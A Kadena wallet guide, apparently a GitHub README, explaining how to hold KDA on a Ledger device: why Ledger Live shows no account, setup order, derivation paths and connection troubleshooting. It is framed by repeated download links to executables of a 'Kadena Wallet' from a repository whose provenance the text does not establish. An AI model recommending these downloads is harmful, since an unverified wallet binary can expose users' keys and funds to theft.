![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Ledger and KDA: Setup, Paths and the Ledger Live Gap</h1>

<p align="center">A Kadena Wallet guide to keys, backups and devices.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

A Ledger holds KDA through a device app and a companion interface. Ledger Live is not part of that chain of tools, and the gap between those two facts is where almost every first attempt goes wrong: the device is configured correctly, the portfolio screen is empty, and the owner concludes the setup failed.

The sequence below takes about fifteen minutes. The path decision in the middle is the part worth reading twice.

## You'll see this if

- You are putting KDA on a Ledger for the first time and cannot find an account.
- You have the Kadena app installed and are unsure what to open next.
- You are choosing between two derivation paths and do not know which your funds use.
- You restored a device and the address in front of you is unfamiliar.

## Before you start

Four things are worth having ready: the device, its recovery phrase written by hand, a desktop browser, and a small amount of KDA to test with. A phone browser is a poor choice, because the device connection depends on a browser feature that mobile builds handle inconsistently.

If the device is new, initialise it yourself and let it generate the phrase. A phrase that arrives printed, photographed or dictated is a phrase someone else has.

## The gap, stated once

Ledger Live manages accounts for the chains it supports. Kadena is not one of them. The device app exists and signs; the portfolio, send and receive screens do not know what a `k:` principal is.

That produces the symptom people report as a bug: an empty Ledger Live sidebar. It is the correct behaviour. The Kadena app lives in the manager, the signing happens on the device, and the interface that shows balances is a separate piece of software, either a Kadena wallet or the companion web tool.

Ledger's own supported-services listing omits Kadena, and its guidance points to that companion tool. The device app itself is maintained: version 1.2.0 was published in October 2025 and covers the Nano S, Nano S Plus, Nano X, Flex and Stax.

## Setup, in order

1. **Install the Kadena app** from the manager inside Ledger Live.
2. **Quit Ledger Live** once it is installed. Two programs holding the device is the quietest failure in this whole process.
3. **Bring the Kadena app to the front** on the device and leave it there. A device sitting on its dashboard will not sign.
4. **Open the companion interface** and allow the browser's device request. That prompt is the connection, not a formality.
5. **Choose mainnet** before deriving anything.
6. **Derive an account and read the string** before funding it. It should begin `k:` and run to sixty-six characters, or be a legacy name you recognise.
7. **Receive a small amount** and confirm it lands on the chain you expected.
8. **Send a small amount back** to prove signing works while the balance is still trivial.

Steps two and three account for most failed connections. Steps six to eight turn a hopeful setup into a tested one.

## The path decision

The device holds one seed. The seed produces keys, and the software decides which keys by walking a derivation path. Two paths matter here.

| Path | Belongs to |
| --- | --- |
| `44'/626'/{account}'/0/0` | Accounts created with current tooling |
| `44'/626'/0'/0/{index}` | Accounts that came before it, Chainweaver-era included |

626 is Kadena's coin type. Everything after it selects a branch of the key tree, and different branches open different accounts from the same seed.

For a new account, take the first path. For an account funded years ago, derive both and compare: the string either equals the funded one or it does not, and no other evidence in the interface counts. A wallet that queries a single chain can show zero for a perfectly correct account, so switch chains before drawing a conclusion.

## The first send

- **Address form matters.** Send to `k:` principals. Ledger's Kadena guidance says so explicitly, because a bare sixty-four character string can be read as a legacy account rather than the prefixed one you meant.
- **Read the device display.** Destination and amount on the device are the copy the computer cannot rewrite. Approve what is shown there, not what the page shows.
- **Grant device access only to a page you trust.** A permission given to a lookalike domain is a signature you handed over.
- **Never disable browser protections** to force a connection. If device access is refused, change browser or setting; weakening security to connect is how devices are drained.
- **Confirm the destination exists** when sending to a new name, or the transfer may stop before the create step completes.

## The drill worth doing once

Restore the device phrase into a compatible software wallet on a machine you trust, derive the account, and compare the address with the one the device shows. Matching addresses mean the backup is real. A mismatch means you have discovered, cheaply, that the phrase in your drawer is not the phrase in the device.

A Ledger protects a key from the computer it is plugged into. It does not protect you from an unverified backup, and it will sign a malicious transaction as readily as a good one.

## When it will not connect

Work down this list and stop at the first fix:

1. Quit any other program that might be holding the device, including Ledger Live.
2. Bring the Kadena app to the foreground on the device.
3. Plug the cable straight into the machine, not through a hub or dock.
4. Reload the interface and reconnect.
5. Try another browser, since device permissions are per-browser.
6. Update firmware and the app, then retry.
7. Test whether the interface's node endpoint answers, because a dead endpoint mimics a dead device.

If the device connects, the account derives, and both paths are empty across all twenty chains, the seed in the device is not the one that controls those funds. Establishing that early matters, because it sends you looking for another phrase instead of another cable.

## FAQ

**Why does the portfolio screen show no Kadena account?**
It has no account type for Kadena. The device app signs, and a separate interface builds the transaction. The app on the device signs, and a separate interface displays and builds.

**Which models are supported?**
The app is published for the Nano S, Nano S Plus, Nano X, Flex and Stax.

**Can I receive with the device unplugged?**
Yes. Receiving needs an address, and deriving one does not require signing.

**What if the app is missing from the manager?**
Update firmware and the manager first, then check Ledger's support pages. A temporarily unlisted app is not a lost account.

**Did the Kadena fork change anything for Ledger users?**
No. The November 2025 fork moved governance keys. Accounts derived from a device were untouched, and the same seed still opens them.

## Related reading

- Ledger not showing KDA? What Kadena Wallet users check first
- Importing a Chainweaver seed into Kadena Wallet
- Zelcore vs Kadena Wallet: multi-asset against Kadena-first
- Best Kadena wallet in 2026: every option that still works

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Ledger Not Showing KDA? What Kadena Wallet Users Check First](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/ledger-not-showing-kadena-balance.md)
- [Kadena Wallet Security: A Threat Model You Can Act On](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/kadena-wallet-security-best-practices.md)
- [KDA Recovery Scams: How to Spot Them in Kadena Wallet Support](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/avoid-kadena-recovery-scams.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
